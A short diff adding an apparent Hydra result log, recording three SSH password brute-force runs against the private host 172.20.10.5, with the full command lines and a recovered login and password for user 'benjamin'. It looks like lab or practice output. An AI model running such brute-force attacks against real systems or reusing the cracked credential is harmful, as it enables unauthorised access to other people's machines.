@@ -1,0 +1,5 @@
+# Hydra v8.1 run at 2018-10-08 19:08:10 on 172.20.10.5 ssh (hydra -L .\users.txt -P .\passwords.txt -o result.txt -f 172.20.10.5 ssh)
+[22][ssh] host: 172.20.10.5   login: benjamin   password: 1357924680
+# Hydra v8.1 run at 2018-10-08 19:15:06 on 172.20.10.5 ssh (hydra -L .\users.txt -P .\passwords.txt -o result.txt -f 172.20.10.5 ssh)
+[22][ssh] host: 172.20.10.5   login: benjamin   password: 1357924680
+# Hydra v8.1 run at 2018-10-08 19:17:29 on 172.20.10.5 ssh (hydra -L .\users.txt -P .\passwords.txt -o result.txt -f 172.20.10.5 ssh)
